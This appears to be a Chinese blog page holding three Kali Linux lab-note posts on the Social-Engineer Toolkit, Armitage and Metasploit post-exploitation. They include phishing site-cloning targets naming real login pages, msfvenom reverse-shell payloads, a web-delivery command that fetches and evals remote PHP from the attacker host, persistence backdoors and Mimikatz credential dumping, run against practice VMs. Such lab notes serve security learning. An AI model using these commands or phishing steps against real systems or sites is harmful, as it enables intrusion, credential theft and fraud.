    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-新闻插播"><a href="#1-新闻插播" class="headerlink" title="1. 新闻插播"></a>1. 新闻插播</h4><ul>
<li>Metasploit被发现两个远程代码执行漏洞<ul>
<li>问题都出在WEB组件方面</li>
<li>MSF不受影响</li>
</ul>
</li>
<li>安全面前软软平等<ul>
<li>没有没有漏洞的软件</li>
</ul>
</li>
</ul>
<h4 id="2-社会工程学"><a href="#2-社会工程学" class="headerlink" title="2. 社会工程学"></a>2. 社会工程学</h4><ul>
<li>为什么在这说社会工程学（Social Engineering）<ul>
<li>Metasploit可以很好的配合到社会工程学攻击的各个阶段</li>
<li>Setoolkit工具包大量依赖Metasploit</li>
<li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=277cNRhLwgALyO7E4Ti_KZHMLZP7dhMYVlHyt_PEGODNkHD7UlOH5tuQpHMpGsyNIGnif-Y30ReZSHsE9ihnX7vp_n4jyvuaNWv8YluiyX4inNUXSdEQ3NKk5i_29NlouiT9Jd8&file_name=/THE%20ART%20OF%20DECEPTION.jpg" alt="THE ART OF DECEPTION"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=d88c7MgLXeqYfkV-a0bkuXecJfVLXdnfHW1mc7qzKUSjxQjGcVR_ttOTE_oBPTupkDr5I_8DfVC_9XdicbhqqB6CBly3QTd-GJd_vqowKoJBPDMC1oKEc7JYRJCL0ek5&file_name=/%E5%85%A5%E4%BE%B5%E7%9A%84%E8%89%BA%E6%9C%AF.png" alt="入侵的艺术"></p>
<ul>
<li>社会工程学<ul>
<li>社会：人式社会化的动物（人与人之间的关系，群体利益决定结构架构）</li>
<li>工程：依据标准的步骤完成任务达成目标的一套方法</li>
<li>通过人的交流，使用欺骗伪装等手段绕过安全机制实现入侵的非技术手段</li>
</ul>
</li>
<li>社会工程学攻击的四个阶段<ul>
<li>研究：信息收集（WEB、媒体、垃圾桶、物理），确定并研究目标人</li>
<li>钩子：与目标建立第一次交谈（Hook、下套）</li>
<li>下手：与目标建立信任并获取信息</li>
<li>退场：不引起目标怀疑的离开攻击现场</li>
</ul>
</li>
<li>类型<ul>
<li>基于人的社工<ul>
<li>搭载</li>
<li>伪造身份</li>
<li>偷听 / 窃肩</li>
<li>▲ 反社工</li>
<li>垃圾桶工程</li>
</ul>
</li>
<li>基于计算机的社工<ul>
<li>弹出窗口</li>
<li>内部网络攻击</li>
<li>钓鱼邮件</li>
<li>419尼日利亚骗局</li>
<li>短信诈骗</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-Social-Engineer-Toolkit（SET）"><a href="#3-Social-Engineer-Toolkit（SET）" class="headerlink" title="3. Social-Engineer Toolkit（SET）"></a>3. Social-Engineer Toolkit（SET）</h4><ul>
<li>Socia-Engineering Attacks<ul>
<li>Spear Phishing Attack Vectors<ul>
<li>Perform a Mass Email Attack（多个Email地址发送）</li>
<li>▲ Create a FileFormat Payload（Payload-Email发送）<ul>
<li>PAYLOADS</li>
</ul>
</li>
<li>Create a Social-Engineering Template（模板Email发送）</li>
</ul>
</li>
<li>Website Attack Vectors（Web攻击向量）<ul>
<li>Java Applet Attack Method</li>
<li>Metasploit Browser Exploit Attack Method</li>
<li>Credential Harvester Attack Method<ul>
<li>Web Templates</li>
<li>Site Cloner（克隆站点，apache_dir/harvester_data.txt）<ul>
<li>Kali的IP</li>
<li>URL地址</li>
<li>▲ 第一次网址为伪造，第二次网址为正确的网址</li>
</ul>
</li>
<li>Custom Import</li>
</ul>
</li>
<li>Tabnabbing Attack Method</li>
<li>Web Jacking Attack Method</li>
<li>Multi-Attack Web Method</li>
<li>Full Screen Attack Method</li>
<li>HTA Attack Method</li>
</ul>
</li>
<li>Infectius Media Generator（感染媒体，USB/CD/DVD → autorun.inf）</li>
<li>Create a Payload and Listener（MSF监听功能，/root/.set/payload.exe，调用MSF控制窗口进行侦听）</li>
<li>Mass Mailer Attack（大量钓鱼邮件）</li>
<li>Arduio-Based Attack Vector（Arduio嵌入开发）</li>
<li>Wireless Access Point Attack Vector（伪造无线AP）<ul>
<li>安装DHCP服务</li>
<li>手段配置</li>
</ul>
</li>
<li>QRCode Generator Attack Vector（生成一个二维码，绑定一个Payload）<ul>
<li>漏洞利用URL地址（/root/.set/reports/qcode_attack.png）</li>
</ul>
</li>
<li>Powsershell Attack Vectors（Powershell脚本）</li>
<li>SMS SPoofing Attack Vector（欺骗短信，但需要提前到指定网站注册购买短信服务）</li>
<li>Third Party Modules（第三方模块，可添加）</li>
</ul>
</li>
<li>⭐ 站点克隆 1 2 3 2<ul>
<li><a href="https://login.taobao.com/member/login.jhtml" target="_blank" rel="noopener">https://login.taobao.com/member/login.jhtml</a> </li>
<li><a href="http://admin.smeshx.gov.cn/login.php" target="_blank" rel="noopener">http://admin.smeshx.gov.cn/login.php</a></li>
</ul>
</li>
<li>⭐ 发送钓鱼软件 1 1 2</li>
<li>⭐ WEB站点攻击 1 2 1 2</li>
<li>▲ 2020.03.04 Github地址：<a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit</a></li>
<li>▲ 2020.03.04 此项目依旧在维护更新，且呈现一种框架性的趋势</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89)%EF%BC%9AArmitage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89)%EF%BC%9AArmitage/" itemprop="url">Kali Linux笔记(一百一十三)：Armitage</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:45:28+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  673 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Armitage图形化前端"><a href="#1-Armitage图形化前端" class="headerlink" title="1. Armitage图形化前端"></a>1. Armitage图形化前端</h4><ul>
<li>开源免费图形前端<ul>
<li>基于JAVA开发的界面</li>
<li>作者自称是众多不会使用metasploit的安全专家之一（命令行）</li>
<li>MSF基于命令行，缺少直观的GUI图形用户接口</li>
</ul>
</li>
<li>Armitage只是调用MSF的漏洞利用能力<ul>
<li>Armitage的每一个GUI操作都可以对应对应MSF中一条命令</li>
</ul>
</li>
<li>红队团队合作模拟对抗<ul>
<li>分为客户端（armitage）和服务器（msfrpcd）两部分</li>
<li>/usr/share/armitage/teamserver ip password</li>
<li>▲ 允许多个客户端连接一个服务器，监听55553</li>
</ul>
</li>
<li>可脚本化</li>
<li>启动方式<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li>Teamserver<ul>
<li>服务端：<strong><code>🔺命令：./teamserver 服务器IP 连接密码</code></strong></li>
<li>客户端：<strong><code>🔺命令：armitage</code></strong></li>
</ul>
</li>
<li>单机启动<br>  -<strong><code>🔺命令：Armitage</code></strong> <ul>
<li>GUI启动</li>
<li>127.0.0.1 55553</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Armitage"><a href="#2-实验–Armitage" class="headerlink" title="2. 实验–Armitage"></a>2. 实验–Armitage</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>单机使用：点击Armitage的图标（127.0.0.1 / 55553）</li>
<li>界面使用</li>
<li><strong><code>🔺命令：cd /usr/share/armitage</code></strong></li>
<li><strong><code>🔺命令：./teamserver Kali的IP pass123</code></strong></li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Tom）</li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Jan）</li>
</ul>
</li>
</ul>
<h4 id="3-Armitage图形化前端"><a href="#3-Armitage图形化前端" class="headerlink" title="3. Armitage图形化前端"></a>3. Armitage图形化前端</h4><ul>
<li>发现主机（顶栏 → Hosts）<ul>
<li>Add Hosts：手动添加IP地址</li>
<li>Import Hosts：扫描结果导入XML文件（nmap、nessus openvas、appscan、nexpose、awvs）</li>
<li>NMAP Scan/MSF Scan：直接扫描发现（nmap、msf）</li>
<li>DNS Enumerate：DNS枚举发现</li>
</ul>
</li>
<li>扫描端口及服务</li>
<li>工作区workspace<ul>
<li>个人视角的目标动态显示筛选，同一team的队员自定义工作区</li>
<li>基于地址的工作区划分</li>
<li>基于端口的工作区划分</li>
<li>基于操作系统的工作区划分</li>
<li>基于标签的工作区划分</li>
</ul>
</li>
<li>生成Payload<ul>
<li>reverse_tcp</li>
<li>bind_hidden_tcp（只有在AHOST主动连接时，才监听4444端口）</li>
<li>bind_tcp</li>
</ul>
</li>
<li>主动获取目标<ul>
<li>ms08_067</li>
</ul>
</li>
<li>被动获得目标<ul>
<li>Browser_autopwn2（伪造网站进行被动攻击）</li>
</ul>
</li>
<li>Meterpreter shell 能力展示<ul>
<li>空密码：aa63…. / 316c</li>
<li>Poviting → ARP Scan（层级结构）</li>
</ul>
</li>
<li>菜单功能<ul>
<li>SOCKS4（用Kali做跳板机，通过建立的meterpreter隧道进行内网漫游）</li>
<li>Script（可添加script脚本，比如Cortana脚本）</li>
</ul>
</li>
<li>Cortana脚本<ul>
<li>Veil-Evasionғ/use/share/veil-evasion/tools/cortana/veil_evasion.cna </li>
<li><a href="https://github.com/rsmudge/cortana-scripts" target="_blank" rel="noopener">https://github.com/rsmudge/cortana-scripts</a></li>
</ul>
</li>
<li>别无他法的的最后选择<ul>
<li>Attacks<ul>
<li>Find Attacks   # 自动分析匹配漏洞利用模块（智能分析分配模块的尝试）</li>
<li>Hail Mary #上帝啊！赐于我力量吧！（端口进行所有模块的尝试，Great级别以上）</li>
<li>洪水式漏洞利用代码执行，流量及特征明显，容易被发现</li>
</ul>
</li>
</ul>
</li>
<li>Armitage现状<ul>
<li>维护不及时，传言此项目已荒废</li>
<li>仍然式目前唯一开源免费的metasploit图形前端</li>
</ul>
</li>
<li>Cobalt Strike</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/" itemprop="url">Kali Linux笔记(一百一十二)：MSF延展用法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:42:32+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-MSF延展用法–Meterpreter后门"><a href="#1-MSF延展用法–Meterpreter后门" class="headerlink" title="1. MSF延展用法–Meterpreter后门"></a>1. MSF延展用法–Meterpreter后门</h4><ul>
<li>持久后门<ul>
<li>利用漏洞取得的meterpreter shell运行于内存，重启失效</li>
<li>重复exploit漏洞可能造成服务崩溃</li>
<li>持久后门保证漏洞修复后仍可远程控制</li>
</ul>
</li>
<li>Meterpreter后门–metsvc<ul>
<li>▲ metsvc不能改端口，不支持身份验证</li>
<li><strong><code>🔺命令：run metsvc -h</code></strong> <ul>
<li>-A：自动启动/exploit/multi/handle监听</li>
<li>-r：删除监听</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong>  </li>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong>  <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong>  </li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST 1.1.1.1</code></strong> </li>
</ul>
</li>
<li>Meterpreter后门–persistence<ul>
<li>▲ 添加VBS脚本，并在注册表添加启动项</li>
<li><strong><code>🔺命令：run persistence -h</code></strong> <ul>
<li>默认使用windows/meterprter/reverse_tcp</li>
<li>-X：自动启动agent当机器开机</li>
<li>-r：要连接的IP</li>
<li>-p：要连接的端口</li>
</ul>
</li>
<li><strong><code>🔺命令：run persistence -X -i 10 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -U -i 20 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -S -i 20 -p 4444 -r 1.1.1.1</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="2-MSF延展用法–Mimikatz"><a href="#2-MSF延展用法–Mimikatz" class="headerlink" title="2. MSF延展用法–Mimikatz"></a>2. MSF延展用法–Mimikatz</h4><ul>
<li>hashdump使用的就是Minikatz的部分功能<ul>
<li><strong><code>🔺命令：getsystem</code></strong>  </li>
<li><strong><code>🔺命令：load mimikatz</code></strong>  </li>
<li>wdigest、kerberos、msv、ssp、tspkg、livessp<ul>
<li>msv：账号加密信息</li>
<li>ssp：账号不加密信息</li>
<li>tspkg：kerveros身份票据信息</li>
<li>wdigest：从内存中获取账号明文密码</li>
<li>kerboros：从内存中获取账号明文密码</li>
</ul>
</li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong>  <ul>
<li>-a：使用具体模块所需要的子参数</li>
<li>-f：使用的模块</li>
</ul>
</li>
<li>查看模块（使用不存在模块，报错显示）：<strong><code>🔺命令：mimikatz_command -f a::</code></strong>  </li>
<li>查看系统账号哈希：<strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong></li>
<li>查看操作系统进程：<strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li>查看操作系统服务：<strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li>查看操作系统支持的加密：<strong><code>🔺命令：mimikatz_command -fcrypto::listProviders</code></strong> </li>
<li>查看地雷雷数：<strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong><ul>
<li>▲ winmine：扫雷游戏</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-MSF延展用法–PHP-shel-Web-Delivery"><a href="#3-MSF延展用法–PHP-shel-Web-Delivery" class="headerlink" title="3. MSF延展用法–PHP shel/Web Delivery"></a>3. MSF延展用法–PHP shel/Web Delivery</h4><ul>
<li>PHP shell<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></strong></li>
<li>MSF启动侦听</li>
<li>上传到web站点并通过浏览器访问<ul>
<li>Web Delivery</li>
<li>利用代码执行漏洞访问攻击者服务器，从攻击者服务器下载远程执行代码，执行下载的代码后反弹一个shell给攻击者的服务器</li>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong> </li>
<li><strong><code>🔺命令：set target 1</code></strong> </li>
<li><strong><code>🔺命令：;php -d allow_url_fopen=true -r “eval(file_get_contents(‘http://1.1.1.1/ fTYWqmu&#39;));&quot;</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-MSF延展用法–RFI远程文件包含"><a href="#4-MSF延展用法–RFI远程文件包含" class="headerlink" title="4. MSF延展用法–RFI远程文件包含"></a>4. MSF延展用法–RFI远程文件包含</h4><ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On </li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> </li>
<li><strong><code>🔺命令：set RHOST 1.1.1.2</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set lhost 1.1.1.1 – exploit</code></strong></li>
</ul>
<h4 id="5-实验准备"><a href="#5-实验准备" class="headerlink" title="5. 实验准备"></a>5. 实验准备</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Window XP的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：jobs</code></strong><ul>
<li>查看job是否一直有任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
<li>执行a.exe</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
<li>Metasploit<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
<h4 id="6-实验–metsvc"><a href="#6-实验–metsvc" class="headerlink" title="6. 实验–metsvc"></a>6. 实验–metsvc</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run metsvc -h</code></strong></li>
<li><strong><code>🔺命令：run metsvc -A</code></strong>（31337）</li>
<li>查看是否拿到shell</li>
<li>在window 7的计算机管理查看是否开启服务meterpreter → metsvc</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
</li>
</ul>
<h4 id="7-实验–persistence"><a href="#7-实验–persistence" class="headerlink" title="7. 实验–persistence"></a>7. 实验–persistence</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run persistence -h</code></strong></li>
<li><strong><code>🔺命令：run persistence -X -p 4444 -r Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：background</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterprter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong><ul>
<li><strong><code>🔺命令：set exitonsession false</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>重新启动</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
<h4 id="8-实验–Mimikatz"><a href="#8-实验–Mimikatz" class="headerlink" title="8. 实验–Mimikatz"></a>8. 实验–Mimikatz</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：load mimikatz</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f a::</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f crypto::listProviders</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong></li>
</ul>
</li>
</ul>
<h4 id="9-实验–PHP-shell"><a href="#9-实验–PHP-shell" class="headerlink" title="9. 实验–PHP shell"></a>9. 实验–PHP shell</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=3333 -f raw -o a.php</code></strong> </li>
<li><strong><code>🔺命令：scp a.php msfadmin@Metasploit的IP:/home/msfadmin</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 3333</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：sudo cp a.php /var/www</code></strong></li>
<li><strong><code>🔺命令：ls /var/www</code></strong>（查看是否已经复制）</li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/a.php" target="_blank" rel="noopener">http://Metasploit的IP/a.php</a></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-实验–Web-Delivery"><a href="#10-实验–Web-Delivery" class="headerlink" title="10. 实验–Web Delivery"></a>10. 实验–Web Delivery</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong><ul>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：set target 1</code></strong>（PHP）</li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>浏览器访问<a href="http://Metasploit的IP，访问DVWA" target="_blank" rel="noopener">http://Metasploit的IP，访问DVWA</a></li>
<li>设置安全级别为低</li>
<li>在Cmomand Exection中执行生成的命令行<strong><code>🔺命令：;php -d allow url fopen=true -r &quot;eval(file get contents(&#39;http://Kali的IP:8080/&#39;));&quot;</code></strong></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-实验–RFI远程文件包含"><a href="#11-实验–RFI远程文件包含" class="headerlink" title="11. 实验–RFI远程文件包含"></a>11. 实验–RFI远程文件包含</h4><ul>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试" target="_blank" rel="noopener">http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试</a></li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On</li>
</ul>
</li>
<li><strong><code>🔺命令：sudo /etc/init.d apache2 restart</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php" target="_blank" rel="noopener">http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php</a> ，远程文件包含测试</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set lhost Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看是否能直接拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li>▲ 2020.03.04 Exploit completed,but no session was created</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
